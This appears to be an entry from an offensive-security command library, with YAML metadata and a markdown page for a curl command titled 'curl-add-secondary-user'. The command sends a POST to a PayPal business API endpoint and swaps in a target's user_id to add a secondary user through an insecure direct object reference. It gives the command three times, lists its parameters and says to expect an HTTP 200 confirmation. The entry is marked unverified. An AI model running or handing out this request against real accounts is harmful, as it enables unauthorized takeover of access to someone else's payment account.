---
data: >-
  curl -X POST https://www.paypal.com/businessmanage/users/api/v1/users -H
  "Authorization: Bearer your_access_token" -H "Content-Type: application/json"
  -d '{"user_id": "target_user_id", "role": "secondary"}'
tags:
  - exploitation
  - idor
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 168427a7-61c1-4b57-af79-285a0b8c4b46
created_at: '2025-12-11T06:10:30.041Z'
updated_at: '2025-12-11T06:10:30.041Z'
verified: false
validated: true
submitted: true
---
# curl-add-secondary-user

## Command

```bash
curl -X POST https://www.paypal.com/businessmanage/users/api/v1/users \
  -H "Authorization: Bearer your_access_token" \
  -H "Content-Type: application/json" \
  -d '{"user_id": "target_user_id", "role": "secondary"}'
```

## Description

Adds a secondary user to a PayPal business account by exploiting IDOR with a manipulated user_id.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: Bearer your_access_token"` | Bearer token | Yes |
| `-d '{"user_id": "target_user_id", "role": "secondary"}'` | JSON payload with user_id | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.paypal.com/businessmanage/users/api/v1/users -H "Authorization: Bearer your_access_token" -H "Content-Type: application/json" -d '{"user_id": "target_user_id", "role": "secondary"}'
```

## Expected Output

HTTP 200 OK with confirmation of user addition.

## Related
- [[procedures/Exploit-IDOR-to-Assign-Secondary-User]]
